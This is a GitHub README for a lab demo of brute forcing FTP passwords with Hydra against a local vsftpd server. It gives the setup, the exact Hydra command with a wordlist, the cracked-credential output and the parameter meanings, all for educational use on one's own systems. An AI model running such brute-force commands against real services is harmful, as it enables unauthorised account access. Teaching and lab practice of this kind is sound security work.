# 🔐 Hydra Brute Force Demo

A practical demonstration of credential brute forcing using **Hydra** against an FTP service on a controlled local environment.

> Copyright (c) 2026 Bighiu Rares — [github.com/Raresney](https://github.com/Raresney)  
> ⚠️ For educational purposes only — run only on systems you own.

---

## 📋 What This Does

Simulates a brute force attack against a local FTP server using a wordlist, demonstrating how weak passwords can be cracked with Hydra.

---

## ⚙️ Requirements

- Kali Linux
- Hydra (`sudo apt install hydra`)
- vsftpd (`sudo apt install vsftpd`)

---

## 🚀 Setup & Run

**1. Run the setup script:**

```bash
chmod +x setup.sh
./setup.sh
```

This will:

- Install Hydra and vsftpd
- Start the FTP service
- Create a test user (`testuser:password123`)

**2. Run the attack:**

```bash
hydra -I -l testuser -P wordlists/test_wordlist.txt ftp://127.0.0.1 -t 4 -V
```

**3. Expected output:**

```
[21][ftp] host: 127.0.0.1   login: testuser   password: password123
1 of 1 target successfully completed, 1 valid password found
```

---

## 🗂️ Structure

```
Hydra_BruteForce/
├── setup.sh                  # Automated setup script
├── wordlists/
│   └── test_wordlist.txt     # Sample password wordlist
└── README.md
```

---

## 🔧 Hydra Parameters

| Parameter         | Description                 |
| ----------------- | --------------------------- |
| `-l username`     | Single username             |
| `-L list.txt`     | Username list               |
| `-p password`     | Single password             |
| `-P wordlist.txt` | Password wordlist           |
| `-t 4`            | 4 parallel threads          |
| `-V`              | Verbose — show each attempt |
| `-I`              | Skip restore file           |

---

## 🛠️ Skills Demonstrated

- FTP brute force with Hydra
- Wordlist-based credential attacks
- Local service setup and exploitation
- Understanding of weak password risks
